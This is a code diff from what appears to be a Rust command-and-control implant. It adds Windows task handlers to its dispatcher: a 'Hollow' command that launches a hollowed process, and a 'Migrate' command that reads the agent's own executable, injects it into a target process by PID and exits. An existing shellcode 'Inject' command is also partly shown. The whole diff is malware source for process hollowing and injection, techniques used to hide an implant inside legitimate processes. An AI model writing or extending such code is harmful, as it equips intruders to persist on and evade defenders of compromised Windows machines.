@@ -49,7 +49,45 @@ pub async fn execute_task(task: &Task) -> String {
             }
         }
 
-        TaskCommand::Migrate { .. } => "migrate not implemented in Phase 2".into(),
+        TaskCommand::Hollow { target_path } => {
+            #[cfg(target_os = "windows")]
+            {
+                match crate::hollow::hollow(target_path) {
+                    Ok(pid) => format!("Hollowed process launched with PID {pid}"),
+                    Err(e)  => format!("[error] {e}"),
+                }
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                let _ = target_path;
+                "process hollowing not supported on this platform".into()
+            }
+        }
+
+        TaskCommand::Migrate { pid } => {
+            // Migration: inject agent into target process and exit current instance.
+            #[cfg(target_os = "windows")]
+            {
+                use std::io::Read;
+                let exe_path = std::env::current_exe().unwrap();
+                match std::fs::read(&exe_path) {
+                    Ok(pe_bytes) => {
+                        match crate::inject::inject(*pid, &pe_bytes) {
+                            Ok(tid) => {
+                                std::process::exit(0);
+                            }
+                            Err(e) => format!("[error] migrate inject: {e}"),
+                        }
+                    }
+                    Err(e) => format!("[error] migrate read exe: {e}"),
+                }
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                let _ = pid;
+                "migrate not supported on this platform".into()
+            }
+        }
 
         TaskCommand::Inject { pid, shellcode } => {
             #[cfg(target_os = "windows")]
